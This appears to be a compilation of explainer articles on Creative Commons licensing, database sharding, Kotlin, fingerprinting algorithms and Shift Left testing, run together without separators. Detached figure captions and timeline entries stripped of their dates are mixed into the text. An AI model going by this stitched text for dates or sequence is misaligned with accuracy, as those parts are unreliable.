CC0 gives maximum freedom to reuse or adapt , even commercially , without attribution .
In 2015 , Flickr started allowing users to share their works under CC0 or PDM .
SpaceX released its images under CC0 .
Europeana had 26,000 images under CC0 plus 3.6 million works under PDM .
Are there guidelines to use and attribute works with CC licenses ?
How to attribute it and where to place it .
Source : Engstrom 2014 .
Attribution should include the original author 's name , title of the work , a hyperlink that points to the page where the work was obtained , the type of license used and a link pointing to the license .
For example , if the work is an image , this attribution may be placed immediately below the image or as an endnote on the same page .
From version 4.0 , attributions may be on a separate page that 's hyperlinked from the place of reuse .
Version 2.0 clarified three conditions for linkback .
Linking back must be practical ; that is , licensee ca n't be faulted for failing to link to a dead page .
The licensor must provide a valid linkback URL .
This URL must point to the correct CC licensing terms and not misdirect users to unrelated sites .
Version 3.0 relaxed the title requirement but added the requirement to link back to source .
It also stated that if you adapt or modify the work , this must be noted .
Here 's an example attribution : " Creative Commons 10th Birthday Celebration San Francisco " by tvol is licensed under CC BY 2.0 .
Are CC licenses an alternative to copyrights ?
CC licenses are not alternatives to copyrights .
A work must be copyrighted in order to be licensed under CC .
Only the copyright owner can place the work under a CC license , or authorize someone to do so .
Creative Commons licenses expire when the underlying copyright and similar rights expire .
CC licenses are non - exclusive : the copyright owner can enter into separate agreements as well .
CC licenses are non - revocable : even if the copyright owner revokes the CC license , all those already reusing the work will continue to do so under the original terms .
The fact that CC licenses are irrevocable is seen by some as a limitation .
It does n't give licensors an option to change their minds later .
CC licenses do n't limit rights granted through statutory exceptions , including fair use .
What are some criticisms of Creative Commons and its licenses ?
With CC licenses , even small modifications can be treated as an adaptation and the person doing it can take credit for it .
However , in a 2012 lawsuit , the U.S. copyright law was applied .
It considered the work as non - derivative since there were no major additions or deletions .
In 2014 , Yahoo !
announced plans to sell prints of photos on Flickr .
Owners of copyrighted photos would get a revenue share but those who have used a CC BY license would get nothing .
Licensors have no protection against who or how their work will be used in the future .
In a similar case , Apple Academic Press republished and sold open - access research articles .
Though not limited to CC - licensed work , plagiarism is a problem .
You could reuse a work based on its stated CC license , but the original work might still be under copyright .
For example , a person who does n't own the image uploads it to Flickr and licenses it as CC BY .
This is in fact a copyright infringement .
There 's also criticism that Creative Commons , as an organization , offers no protection .
You 're on your own if things go wrong .
If I wish to adopt Creative Commons licensing , what resources are available ?
The Creative Commons website is a good place to start .
The CC blog is a place to get news and tips about CC licensing .
The CC FAQ is a useful reference .
To get connected with the CC community , join the CC Global Affiliate Network , one of their mailing lists or Slack channels .
There 's also the annual CC Global Summit for discussions , workshops and community building .
To help find works licensed under Creative Commons , there 's the official CC Search .
Additionally , there are plenty of other search services .
Examples include Free Music Archive , Let 's CC , Internet Archive , 500px Creative Commons , and Project Gutenberg .
How is the Creative Commons organization structured ?
Creative Commons is a network of staff , board , emeritus , advisory council , audit committee , and affiliates around the world .
The Creative Commons Global Affiliate Network includes over 500 volunteers and community members who serve as CC representatives in over 85 countries .
In 2017 , a new strategy was formed .
The new network is built on individuals rather than teams that depend on organizations .
Organizations can also be part of it as partners .
The network is not a separate legal entity and is supported by CC HQ .
The network comprises of local chapters , each having an elected representative and a public lead or coordinator .
Governance is via the Global Network Council with one representation from each chapter plus three from CC HQ .
Finally , all activities are carried out within platforms , or areas of work .
Some of these include Arts & culture , Open access , Open data , Technology , Open science , etc .
The Copyright Term Extension Act ( CTEA ) in the U.S extends copyright terms by another 20 years .
This created problems for Eric Eldred , who was planning to publish works that were about to come into the public domain .
Together with Lawrence Lessig , a professor at Harvard Law School , they challenged the Act .
They eventually lost the case in 2003 .
Inspired by Elred 's idea to make works freely available on the Internet , Lawrence Lessig created Creative Commons .
The first version of Creative Commons licenses is published .
Version 2.0 of CC licenses has been released .
Attribution is treated as standard practice and must link back to the licensor 's work .
The use of CC licenses for music is clarified .
Version 3.0 of CC licenses has been released .
This clarifies aspects of internationalization .
The term unported license is used to refer to licenses not adapted to local jurisdictions .
A compatibility structure is included so that users know what license to use based on source licenses .
To enable creators to surrender the copyright and database rights to their work , and place them as nearly as possible in the public domain , CC0 was created .
It 's universal and can be used in any jurisdiction .
It 's not exactly a license but a legal tool .
It 's the " no rights reserved " alternative to CC licenses .
Wikimedia Foundation voted to move all its content from the GNU Free Documentation License ( GFDL ) to Creative Commons Attribution Share - Alike 3.0 ( CC BY - SA 3.0 ) license .
GFDL is suited for software documentation and it requires that full licensed text be included .
Comparatively , CC BY - SA 3.0 is easier to use with only a link to the license .
Version 4.0 of CC licenses has been released .
This offers global licenses that can be used without " porting " .
This effort to internationalize the licenses started in December 2011 .
Attribution is allowed via a link to a separate page .
A licensor may request removal of attribution if so desired .
Any licensing breach can be corrected within 30 days .
Ported licenses are available for 60 countries .
For example , India has ported CC license v2.5 as its latest ; China has v3.0 .
With v4.0 , port licenses are largely redundant .
Growing adoption of CC licenses .
Source : Merkley 2018 .
The number of works licensed under CC has grown from 50 million in 2006 to 1.47 billion in 2017 .
In 2017 , the CC Search tool got 1.5 million queries and the CC website got 50 million visitors .
An SQL database table is split into three shards .
Source : Oracle Docs 2020b , fig .
49 - 1 .
In the age of Big Data , popular social media platforms and IoT sensor data , datasets are huge .
If such a dataset is stored in a single database , queries become slow .
Overall system performance suffers .
This is when database sharding becomes useful .
A single logical dataset is split into multiple databases that are then distributed across multiple machines .
When a query is made , only one or a few machines may be involved in processing the query .
Sharding enables effective scaling and management of large datasets .
There are many ways to split a dataset into shards .
Sharding is possible with both SQL and NoSQL databases .
Some databases have out - of - the - box support for sharding .
For others , tools and middleware are available to assist in sharding .
Database replication , partitioning and clustering are concepts related to sharding .
When do I need to shard my database ?
When to do database sharding .
Source : Nasser 2020 .
SQL query performance can be improved by simply indexing tables .
But on large tables ( millions of rows ) searching even the indices can be slow .
One approach is to do partition .
Large tables are split into smaller tables .
Each partition has its own index .
Suppose tables are partitioned by rows , the query is processed on a smaller index .
All partitions reside on the same server .
A complementary approach is vertical scaling , which is a hardware upgrade : faster processor , more RAM , faster disk , etc .
However , this is not scalable or cost effective in the long run .
Even with partitioning and vertical scaling , the server can get overwhelmed with too many requests .
One solution is replication .
The master database is replicated on other servers called slaves .
Reading query is processed by one of the slaves .
This speeds up database reading but not writing , which happens only on the master server .
Reads can also be improved with caching .
When all these have failed , use sharding as a last resort .
Sharding enables horizontal scaling , which involves adding more servers that share the load and process requests in parallel .
How is sharding different from partitioning ?
Some use the terms partitioning and sharding interchangeably .
However , there are clear differences .
All partitions of a table reside on the same server whereas sharding involves multiple servers .
Therefore , sharding implies a distributed architecture whereas partitioning does not .
Partitions can be horizontal ( split by rows ) or vertical ( by columns ) .
Shards are usually only horizontal .
In other words , all shards share the same schema but contain different records of the original table .
For this reason , sharding is sometimes called horizontal partitioning .
Due to its distributed nature , sharding is more complex than partitioning .
Many databases , including older ones , offer built - in support for partitioning .
Sharding is supported mainly by modern databases .
Where databases lack support for sharding , and no relevant middleware is used , the logic of which shard to hit resides in the application code .
With partitions , the logic resides at the database level .
Sharding adopts a shared - nothing architecture .
A shard is not aware of other shards .
This is often not the case with database clustering or replication .
What are some strategies for database sharding ?
Illustrating hash - based and range - based sharding .
Source : Adapted from Kim 2014 .
A sharding strategy is necessary to determine which record goes into which shard : Key - Based : One of the columns , called shard key , is put through a hash function .
The result determines the shard for that row .
also called hash - based sharding or algorithmic sharding .
Range - Based : For example , given a product - price database , prices in the range 0 - 49 go into shard 1 , 50 - 99 into shard 2 , and so on .
The price column is the shard key .
If the store sells a lot more low - value products , this will result in unbalanced shards and hotspots .
Dictionary - Based : A lookup table is used .
This is a flexible approach since there 's no predetermined hash function or ranges .
An example is to shard by customer 's region , such as the UK , US , or EU .
Hierarchical : A combination of row and column is used as the shard key .
Previously mentioned sharding strategies can be used on the key .
Entity Groups : To facilitate queries across multiple tables , this strategy places related tables within the same shard .
This brings stronger consistency .
For example , all data pertaining to a user resides in the same shard .
How should I select a suitable shard key ?
Selecting a shard key is an important decision .
Once selected , it 's hard to change this in the future .
Consider how the choice will affect the current schema , queries and query performance .
The choice should support current and future business use cases .
Identify main parts of the data and clustering patterns .
For efficiency , the data type of the shard key is ideally an integer .
Sharding must balance two constraints : minimize cross - partition queries and distribute the load evenly by sharding at the right granularity .
The shard key must be on a column ( SQL ) or field ( NoSQL ) that meets the following : Stability : It almost never changes .
Otherwise , we could incur expensive movement of data from one shard to another .
High Cardinality : It has many more unique values relative to the number of shards .
Low Frequency : Every value occurs at a low frequency .
Non - Monotonic : The value does n't increase or decrease monotonically .
Could you share some examples of shard keys ?
In an eCommerce application , Inventory , Sales and Customers could be functional areas with shard keys ` productID ` , ` orderID ` and ` customerID ` respectively .
Alternatively , ` customerID ` could be the shard key for sales as well .
Typically , ` customerID ` is unique and of high cardinality .
Hence , this could be the shard key rather than ` country ` .
In an IoT application , if all devices are storing data at similar intervals , then ` deviceID ` is a suitable key .
If some devices store a lot more data than others , this would create hotspots and therefore ` deviceID ` may not be suitable .
For an application with a few status codes , using a status code as a shard key is not a good idea .
Writing across shards is to be avoided .
As an example , an eCommerce order may insert a buyer 's address and seller 's address .
Though both are part of the same logical table , they could reside in different shards .
Another example is when a transaction inserts an order entry and an inventory entry .
These two could be on different shards .
It 's preferable to locate all data pertaining to a transaction on a single shard .
What 's a typical database sharding architecture ?
A MongoDB sharded cluster .
Source : MongoDB Docs 2020a .
There 's no requirement that a server must host a single shard .
Multiple shards can be hosted on the same server .
When the load increases , they can be moved to separate servers .
The original database is split by a shard key .
Data that has the same key is called a logical shard .
One or more logical shards when hosted on the same server is called physical shard .
In typical architecture , a cluster proxy is connected to multiple shards .
The proxy has access to a configuration service ( such as Zookeeper ) that keeps track of shards and their indices .
The cluster proxy looks at a query and the configuration to know which shard to hit .
If shards are large , each shard may also have its own proxy that can do caching and monitoring .
With hierarchical sharding , each shard may be sharded further .
In Oracle Sharding , the Shard Catalog contains the configuration .
Routing is done by the Shard Director .
All shards are in the same region ( data center ) .
For high availability , replicated shards are in the same region as the primary shard .
For disaster recovery , replicated shards are in other regions .
What is the difference between SQL and NoSQL databases ?
Comparing SQL and NoSQL sharding architectures .
Source : Adapted from Lim 2020 .
SQL databases were designed with ACID transactions in mind , not scalability .
NoSQL databases were designed with scalability in mind .
Sharding in NoSQL databases happens almost transparent to the user .
Availability is prioritized over consistency .
In SQL tables , the shard key is based on one or more columns .
In NoSQL records , one or more fields are used instead .
Since SQL databases combine sharding with replication , it 's a master - slave architecture .
In the NoSQL world , shards are referred to as nodes .
All nodes are equal , with one node connected to a few others in a graph - like structure .
When a query comes in , a coordinator node is selected .
If the coordinator can respond directly , it will .
Otherwise , it forwards the query to another node that has the data .
Nodes frequently share information about the data they store via what 's called the gossip protocol .
What are the pros and cons of database sharding ?
The main benefits of sharding include horizontal scaling , better performance , and higher availability .
Processing and storage are distributed .
An outage will most likely affect only one shard .
Sharding can lower cost by avoiding high - end hardware or expensive software .
Commodity hardware and open - source software can be used .
Shards are suited for cloud deployments .
Any upgrade can be tested on one shard before rolling it out to the rest .
Shards can be geographically distributed to meet regulatory requirements or be closer to customers .
The complexity inherent with sharding is the main drawback .
Improper implementation can lead to loss of data or data corruption .
Maintaining multiple shards is not trivial and teams have to be trained in new workflows .
Once sharded , it 's hard to return to unsharded architecture .
Databases without native support for sharding will need custom solutions .
Since data is distributed across many servers , a ` JOIN ` operation can easily done in a single SQL database becomes difficult .
Such an operation may hit many shards and require merging responses .
Shards may become unbalanced over time .
In other words , some shards grow faster than others , thus becoming database hotspots .
Resharding is the solution .
What resources or tools are available to facilitate database sharding ?
Sharding an Amazon RDS for OLTP .
Source : Zeng 2019 .
Cassandra , HBase , HDFS , MongoDB and Redis are databases that support sharding .
Sqlite , Memcached , Zookeeper , MySQL and PostgreSQL are databases that do n't necessarily support sharding at the database layer .
For databases that do n't offer built - in support , sharding logic has to reside in the application .
To avoid this complexity in application code , middleware can help .
Two open - source middleware are Apache ShardingSphere and Vitess .
Plugins for ShardingSphere offer support for MySQL , PostgreSQL , SQLServer , and Oracle .
Vitess supports MySQL and MariaDB .
MySQL itself does n't offer sharding but MySQL NDB Cluster and MySQL Fabric can be used to achieve sharding .
For sharding PostgreSQL , PL / Proxy , Postgres - XC / XL and Citus can be used .
On Google Cloud Platform , Cloud SQL and ProxySQL services can be used to shard PostgreSQL and MySQL databases .
On AWS , Amazon RDS is a service that can implement a sharded database architecture .
The DB engine can be MySQL , MariaDB , PostgreSQL , Oracle , SQL Server , and Amazon Aurora .
For data analytics , Amazon Redshift can store data from all shards .
Amazon RDS also facilitates resharding .
Could you share some best practices for database sharding ?
Shard ID is suffixed to primary keys to keep them unique across shards .
Source : Zeng 2019 .
Consider sharding only when other approaches have failed .
Main reasons for sharding include constraints on storage , processing , network bandwidth , regulations and geographic proximity .
Data analytics is usually done on the entire dataset .
Hence , sharding is more suited for Online Transaction Processing ( OLTP ) rather than for Online Analytical Processing ( OLAP ) .
Tables with foreign key relationships can all share the same shard key .
To keep primary keys unique across all shards for later OLAP , shard IDs can be suffixed to primary keys .
Sharding can be combined with replication .
In fact , for high availability it 's common to replicate shards .
We could even duplicate some data across shards , such as duplicating chat messages in sender 's and recipient 's shards .
Monitor the performance of all shards in terms of CPU utilization , memory usage , and read / write performance .
Consider resharding if there are hotspots .
It 's predicted that distributed databases with specialized hardware will die .
Multiprocessor systems are seen to be I / O limited .
However , later years prove this prediction to be false .
This is due to the growth of relational databases through the 1980s .
These can be easily parallelized .
High - speed networking to interconnect parallel processors has become available .
Teradata , Tandem and other startups successfully market parallel machines .
GAMMA is an early multiprocessor parallel database system .
Source : DeWitt et al .
1986 , fig .
3 .
DeWitt et al .
present a parallelized database they call GAMMA .
It consists of 20 VAX 11/750 processors , each with dedicated memory .
Eight of them have disk drives for database storage .
The machines are connected by an 80Mbps token ring .
They note four ways to split data : round - robin , hashed , range ( user specified ) , and range ( uniform distribution ) .
In a later version of GAMMA ( 1990 ) , each processor has its own disk storage , giving rise to the term shared - nothing architecture .
Sharding strategies : ( a ) round - robin , ( b ) range , ( c ) list , and ( d ) hash .
Source : Costa et al .
2015 .
DeWitt and Gray apply dataflow programming paradigm to propose a distributed database architecture they call partitioned parallelism .
Input data is partitioned and sent to multiple processors and memories .
They propose four sharding strategies : round - robin , range , list and hash .
The use of the term " shard " in a computing and storage context probably originates with the massively multiplayer online game called Ultima Online .
The story is about the fictional world where Sosaria was trapped in a crystal .
When the crystal shattered , each shard contained a copy of Sosaria .
Each copy of the world runs on its own server and database .
In a presentation , Fitzpatrick explains how sharding helped LiveJournal scale their backend .
The site launched in 1999 but grew to 7.9 million accounts by August 2005 .
With thousands of hits per second , sharding is adopted as the solution .
The term " shard " is not used .
Instead , the term user cluster is used .
Within a cluster , replication is done .
Google 's Bigtable is a distributed storage that can handle petabytes of data across commodity servers .
Web indexing , Google Earth , Google Analytics , Orkut , and Google Finance are some projects at Google using Bigtable .
Comparing consistent hash sharding and range sharding .
Source : Ranganathan 2020 .
At Facebook , engineers started working on a NoSQL database called Cassandra .
They 're inspired by the range sharding of Google 's Bigtable and the consistent hash sharding of Amazon 's DynamoDB .
They adopt linear hash sharding that is a hybrid of the two .
It preserves the sort order but distribution is uneven .
This is later changed to consistent hash sharding at the expense of range queries .
The architecture of Vitess .
Source : Constine 2018 .
A team on YouTube created Vitess to solve scalability challenges to its MySQL data storage .
Before Vitess , YouTube tried replication to speed up reads , and then application - level sharding to speed up writes .
With Vitess , routing logic can be removed from the application code .
Vitess sits between the application and the database .
In February 2018 , Vitess became a CNCF incubation project , graduating in November 2019 .
Kotlin logo .
Source : Wikipedia 2019 .
Kotlin is a next - generation programming language developed by JetBrains .
It combines both object - oriented and functional features .
It 's focused on interoperability , safety , clarity and tooling support .
It can be used for server - side , desktop or mobile apps .
It 's statically typed like Java , C , and C++ .
It 's also fully compatible with Java but has a much simpler syntax .
Google officially supports it for the Android platform and therefore Android apps can be written in Kotlin .
Kotlin has multiplatform support , which means that code can be reused across Android , iOS or the Web .
It 's open source under the Apache 2 License .
It 's managed by the Kotlin Foundation .
In what application areas is Kotlin most suitable ?
Kotlin is suitable for a range of application areas .
Source : Gill 2017 .
A diverse set of apps can be built with Kotlin since it 's a general - purpose language .
It can be used to build mobile apps such as Android apps .
Server - side apps can be built with Kotlin .
Wherever Java is used for enterprise apps , such apps can be migrated to Kotlin .
Since Kotlin can be compiled to JavaScript it can be used for web app development .
Kotlin uses two file extensions : ` .kt ` for object - oriented programming and ` .kts ` for command - line scripting .
This suggests that Kotlin can be used for scripting .
Kotlin also has an interactive shell .
This is useful for learning or clarifying doubts since results of code execution can be seen right away .
In the real world , adopters of Kotlin include Pinterest , Gradle , Evernote , Corda , Coursera , Uber , Trello , Kickstarter , Square , and many more .
What 's the difference between Kotlin and Java ?
Use of the Kotlin data class simplifies coding .
Source : Paul 2018 .
While there are differences , it 's important to first note that Kotlin is compatible with Java .
Kotlin code can be mixed with Java and can call existing Java libraries .
IDEs also support automated conversion of Java code to Kotlin code .
This makes the transition from Java to Kotlin a lot easier for existing projects .
Since Kotlin targets JVM , Kotlin ` .kt ` files compile to ` .jar ` files .
Here are some reasons why it makes sense to move to Kotlin : Learning Curve : Kotlin has a simpler syntax and is therefore easier to learn .
Development Environment : Kotlin has excellent IDE support , including IntelliJ IDEA and Android Studio .
Compilation is fast , sometimes faster than Java .
Similar support is lacking in Scala .
Concise : Kotlin does more with less code .
Strong type inference is one reason .
Java has always been known for its verbosity .
Performance : With Kotlin ’s support for inline functions , code often runs faster .
Safe : Kotlin avoids NullPointerException .
Since you write less code , there 's less chance of introducing errors .
Multiplatform : Though initially created for JVM , Kotlin can be used for front - end development and even native apps .
Could you mention some key features of Kotlin ?
A Survey from 2018 reveals favourite Kotlin features .
Source : Pusher 2018 .
Here are some features of Kotlin : Extensions : Add extra functionality to an existing component .
Higher - order Functions : Functions themselves can be arguments to or returned from other functions .
Interoperable with Java : Kotlin code can be called from Java code and vice versa .
Null Safety : Objects are null safe by default so that nasty null pointer exceptions are avoided .
Smart Cast : Object is automatically cast to a desired type .
Default Arguments : Java took the approach of function overloading instead .
Named Arguments : Makes the code more readable and the order of arguments can be changed .
Multi - value Returns : Returned values can be unpacked into separate variables using destructuring declaration .
Data Class : Gets rid of the more verbose getters and setters in Java .
A JetBrains survey from 2017 showed that three features are highly requested : collection literals , Single Abstract Method ( SAM ) conversions for Kotlin interfaces , and truly immutable data .
JetBrains makes no promise if and when these features might be available .
There are also features that developers do n't want : accessing private members from tests , collection comprehensions , and static members in classes .
What resources are available for a Kotlin beginner ?
Android folks talk about the good things in Kotlin .
Source : Android Developers YouTube 2017 .
Start by reading some examples at Kotlin Playground .
For more in - depth information , read the official Kotlin documentation or tutorials .
To learn by doing short exercises , Kotlin Koans is recommended .
It 's a series of exercises that will help you learn Kotlin step by step .
The Kotlin style guide is essential for reading .
There 's also a Kotlin for Android style guide .
For the latest news , follow the Kotlin blog or the weekly mailing list .
Links to other community resources such as podcasts , talks and Slack channels are available online .
JetBrains unveils Kotlin at the JVM Language Summit .
It 's a new language for the Java Virtual Machine ( JVM ) .
The team is led by Dmitry Jemerov and they have been working on it for almost a year .
Since JetBrains makes development tools , work on IDE support for Kotlin happens in parallel with language design and evolution .
JetBrains engineers later commented that although the Scala was popular , it was n't as fast or simple as desired .
Groovy and Clojure have different programming paradigms .
Dr. Dobb 's journal names Kotlin as the Language of the Month .
JetBrains opened sources for the project under the Apache 2 License .
This includes the compiler , Ant / Maven integration tools , IntelliJ IDEA plugin and enhancements to basic Java libraries .
Kotlin v1.0 has been released .
Future releases will remain backward compatible with v1.0 , thus showing that Kotlin is mature .
At Google I / O 2017 , Google announced support for Kotlin on Android .
Until then , Android supported only Java and C++ .
It 's mentioned that Expedia , Flipboard , Pinterest , and Square are among those already using Kotlin in production .
Android support marks a turning point in Kotlin adoption .
For example , by November 2017 , the number of lines of code on GitHub rose from 5 million to 25 million .
A project codebase can contain common and platform - specific modules .
Source : Jemerov 2017 .
Kotlin v1.2 has been released .
In v1.1 it was possible to compile Kotlin to JavaScript and run it within a browser .
With v1.2 , it 's possible to share code between JVM and Javascript platforms .
Regular updates to v1.2 are made .
In September 2018 , v1.2.70 was released .
Kotlin v1.3 has been released .
Coroutines is now a stable feature and useful for writing non - blocking code .
To compile code directly to native binaries , Kotlin / Native is released as a beta version .
To reuse code across platforms , multiplatform features remain experimental but get many updates .
The Kotlin team released version 1.0 of Ktor , a web framework built in Kotlin .
It 's good for building asynchronous servers and clients in connected systems .
Thanks to coroutines , complex asynchronous constructs can be expressed as sequential code .
It 's claimed that Ktor is already running at scale in many production systems .
Illustrating a fingerprinting function .
Source : Wikipedia 2018a .
Human fingerprints are defined by tiny ridges , spirals and valley patterns on the tip of each finger .
They are unique : no two people have the same ones .
Similarly , a fingerprinting algorithm in computer science is one that maps large data ( such as documents or images ) to a much shorter sequence of bytes .
Such a sequence may be called the data fingerprint .
In essence , large data is more tersely represented by its fingerprint .
This fingerprint uniquely identifies the original data , just as human fingerprints uniquely identify individual people .
Fingerprinting can be applied to different types of inputs : documents , images , audio , video , or any arbitrary data .
While fingerprints may identify the original data , they 're not a compression technique .
This means that original data can not be derived from its fingerprint .
Fingerprints help in quickly checking the integrity of data or retrieving documents from large filesystems .
What are the characteristics of a good fingerprinting algorithm ?
Like any other algorithm , fingerprinting algorithms must balance speed , memory usage and code size .
In addition , they must guarantee virtual uniqueness .
No two files , even if they differ by a single bit , should end up with the same fingerprint .
When two files generate the same fingerprint , we call it a collision .
A good algorithm guarantees that the probability of collision is extremely small .
Conversely , when two files differ even slightly , their fingerprints must be significantly different .
This property is called the avalanche effect .
In the world of cryptography , this is also called diffusion .
For some applications , algorithms must support compounding , which is about fingerprinting a composite file from the fingerprints of its constituent parts .
Computer files are often combined in various ways , such as concatenation ( archive files ) or symbolic inclusion ( C preprocessor 's ` # include ` directive ) .
Compounding property may be useful in some applications , such as detecting when a program needs to be recompiled .
What are some use cases of fingerprinting algorithms ?
When we need to search for large filesystems or databases , fingerprints are used to speed up data retrieval .
Rather than comparing large amounts of content , it 's sufficient to compare their fingerprints .
When we upload files , cloud providers use fingerprints to do deduplication so that multiple copies of the same file are avoided .
When users upload content to public sites , fingerprints can tell if it 's banned or copyrighted content .
In companies , fingerprints can prevent employees from emailing sensitive content such as patent documents .
When fingerprints of a file do n't match , we can say that data integrity is compromised , that is , the file 's been tampered with .
In other applications where file changes need to be synchronized over a network , fingerprints help in bandwidth reduction .
Rather than transfer whole files , fingerprints can tell what parts of the file have changed and transfer only those .
Likewise , public - key fingerprints are used instead of long public keys .
In distributed systems where unique names must be maintained , fingerprints are used .
For identification , audio fingerprinting is used to identify songs ; image fingerprinting to identify cameras , or pornographic content .
Could you describe some fingerprinting algorithms ?
Hash functions , also called fingerprinting functions , are often used to reduce the arbitrary length of data to a fixed length of bytes .
The output is called a hash or a fingerprint .
Some hash algorithms have cryptographic properties and , hence , are called cryptographic hash functions .
With these , it 's difficult for two different inputs to have the same hash .
Cryptographic hashing algorithms include MD5 and SHA-1 .
Rabin 's algorithm uses polynomials over a finite field to generate hashes .
It 's able to give us a precise calculation of the probability of collision .
They 're also faster than cryptographic hash algorithms .
However , they 're said to be insecure against malicious attacks .
This is a rolling hash .
Others include TTTD , FBC and what 's used in ` rsync ` .
ML algorithms for fingerprinting are trained on deterministic data and then used for prediction .
However , these require lots of training data .
Are there special considerations for audio / video fingerprinting ?
An example of audio fingerprinting done on frequency spectrum .
Source : Jovanovic 2014 .
Normally , fingerprints must be unique even if the original content changes slightly .
However , audio and video are often subject to noise , distortions or variations in encoding .
Thus , it 's not useful to fingerprint them directly .
Algorithms must be robust ; that is , even in the presence of noise or distortion , fingerprints must be similar , if not the same .
Contents that are perceptually different must produce different fingerprints .
For audio , perceptual traits such as zero crossing rate , frequency spectrum and tempo can be used .
For video , colour histogram , mean luminance , motion detection , ordinal intensity signature , and spatial distribution of colour or objects in a frame are some features to consider .
Even in text processing , sometimes we want to know if two documents are similar .
In this case , we do n't want to minimize the probability of collision .
Instead , we need to maximize it .
Thus , we have Locality - sensitive hashing ( LSH ) or MinHash algorithms .
As an example , 5 words n - grams are used to find out if two documents are similar .
Could you name some applications or products that use fingerprinting ?
Process flow in YouTube 's Content ID .
Source : Pacheco 2013 , slide 13 .
A LBFS is a low - bandwidth networked filesystem that uses SHA-1 hashing to determine if a data chunk needs to be transferred over the network .
Venti , an archival storage system , uses SHA-1 hashing of a data block .
Blocks are addressed by their hashes .
Therefore , block content can not be changed without changing the address .
Thus , Venti enforces a write - once policy and deduplication .
Pcompress does compression and deduplication for data archives .
For deduplication , it uses fingerprinting at chunk level and rolling hash computations .
Since 2007 , YouTube has been using a system called Content ID to flag content that infringes upon copyrights .
It uses both audio and visual fingerprinting , and , more recently , enhanced with machine learning .
Shazam identifies songs based on audio fingerprinting .
Audible Magic employs its audio / video fingerprinting technology for content providers who wish to protect their copyrighted content .
By computing a hash of hashes , Surety offers a timestamped data integrity service .
In blockchain technology , each block is hashed and these hashes influence those of future blocks .
These hashes serve to identify and verify the integrity of blocks .
How 's digital fingerprinting related to fingerprinting algorithms ?
Digital fingerprinting is a broader concept and fingerprinting algorithms may be treated as a specific case .
The common interpretation is that digital fingerprinting is used to track or profile individuals based on the tools they use or how they interact online .
For example , users can be tracked based on their browsers , browser settings , screen resolution , operating system , location , language settings , etc .
The term browser fingerprinting has been used to describe this approach .
Similarly , there 's canvas fingerprinting that 's based on GPU and graphics drivers .
At device level , MAC address , IP address or TCP / IP configuration could be used .
The purpose is to identify criminals based on their fingerprints or to combat online piracy .
Another use is to build a general profile of individuals that can be attractive to advertisers to serve personalized ads .
Digital fingerprinting therefore brings up the issue of privacy .
Users have been tracked across browsers with an accuracy of 99.2 % .
How 's a fingerprinting algorithm different from watermarking ?
Watermarking is typically employed for documents , images and video .
It 's a visible marking that serves to discourage content piracy .
There 's also invisible watermarking that can be used to track the source of a file because each file is stamped with a unique watermark .
With fingerprinting , we do n't have to modify the original file .
It 's more about prevention than tracking .
A file 's fingerprint is compared against a database to flag copyrighted content or simply to identify the file .
Rolling hashes are computed from a sliding window .
Source : Ghosh 2013 .
Michael O. Rabin publishes Fingerprinting By Random Polynomials .
It introduces the concept of rolling hashes based on a sliding window .
Instead of having fixed - size data chunks , variable - sized chunks give better performance in data deduplication applications .
Ronald Rivest proposes MD5 , a cryptographic hash function .
It 's offered without licensing .
Weaknesses are identified in the following years .
In 2004 , enhanced differential attacks were discovered .
By 2009 , this attack was optimized so that MD5 collisions could be discovered in milliseconds .
The National Institute for Standards and Technology ( NIST ) , USA , proposes the Secure Hash Algorithm ( SHA ) .
In 1995 , this was replaced with SHA-1 due to a flaw in the original algorithm .
SHA-1 produces 160-bit hashes .
SHA-1 itself was attacked in 2005 .
Google publishes full details of another attack in 2017 .
Shazam was founded based on the idea of using audio fingerprinting to identify music , movies , ads and shows .
In 2018 , it was acquired by Apple .
NIST proposes SHA-2 as a replacement for SHA-1 .
SHA-2 produces longer hashes of 224 , 256 , 384 or 512 bits .
Google introduced a beta version of YouTube Video Identification to help copyright owners manage their content on YouTube , particularly when uploaded by others .
The service uses video fingerprinting as the technique and later evolves into Content ID .
Shift Left is about doing things earlier in the development cycle .
Source : van der Cruijsen 2017 .
A typical software development process is sequential ( 1970s-1990s ) : define requirements , analyse , design , code , test and deploy .
In this process , testing happens towards the end .
Problems uncovered by testing at such a late stage can cause costly redesigns and delays .
The idea of Shift Left is to involve testing teams earlier in the process and to think about testing at all stages of the process .
When the software development process is viewed as a left - to - right sequential process , doing testing earlier may be seen as " shifting it to the left " .
The term itself can be seen as a misnomer since we are not simply " shifting " but doing tests at all stages of the process .
Shift Left , as a principle , started with testing but it 's beginning to be employed in other disciplines such as security and deployment .
What exactly do we mean by the term " Shift Left " ?
Shift Left , explained .
Source : EvilTester 2018 .
The principle of Shift Left is to take a task that 's traditionally done at a later stage of the process and perform that task at an earlier stage .
An example of this is testing .
With the traditional Waterfall model , testing is done just before releasing the product into production .
This means that serious problems uncovered so late can cause major redesign and long delays .
Shift Left Testing addresses this by involving testing teams early in the process .
Issues , be it in design or code , can be solved early on before they become major .
In fact , shift - left is less about problem detection and more about problem prevention .
Shift Left does n't mean " shifting " the position of a task within a process flow .
It also does n't imply that no testing is done just before a release .
It should be seen as " spreading " the task and its concerns to all stages of the process .
It 's about continuous involvement and feedback .
In addition to the process changes , Shift Left is also about the people .
For example , testing teams must now work more closely with development teams .
What are the key benefits of Shift Left ?
Shift Left identifies potential roadblocks and bottlenecks early on when there 's still scope to change and improve design .
Problems are addressed long before release without giving into the pressure of an imminent deadline .
There are obvious cost savings for the project since problems identified earlier are cheaper to fix .
Shift Left reduces risk since many issues are addressed long before the release .
Releases can be made faster with better quality .
Automation is essential .
This reduces human errors , increases test coverage and lets testers focus on more inspiring tasks .
Since teams work closely , some level of whitebox testing can be done .
It 's also easier to estimate effort and plan for resources .
Often , debugging problems in production is hard and shift - left ensures most problems are caught much earlier , where they are easier to debug and fix .
In what disciplines of software development is Shift Left applied ?
Shift Left is being used in the following disciplines : Testing : It 's in testing that Shift Left started .
It aligns with Agile practices such as Test - Driven Development ( TDD ) and Behaviour - Driven Development ( BDD ) .
For example , by doing integration testing earlier , design can be changed more easily .
Security : Security is addressed right from the development stage .
When we combine DevOps , we get what we call DevSecOps .
Security standards must be in place .
Security folks must use the same tools as DevOps and be empowered to fix code on their own .
Shift - lefting for security is particularly important for open source code .
Deployment : When apps are on the cloud , continuous deployment has become common practice to quickly deliver the latest fixes and features .
The use of templates , patterns and automation streamlines this .
Building , provisioning and deploying of software is automated .
In fact , continuous deployment enables continuous testing .
Design : Poor requirements can lead to a product not aligned with business needs .
Going beyond requirements , the entire team can adopt a design - thinking mindset .
Everyone would have a shared vision of the product .
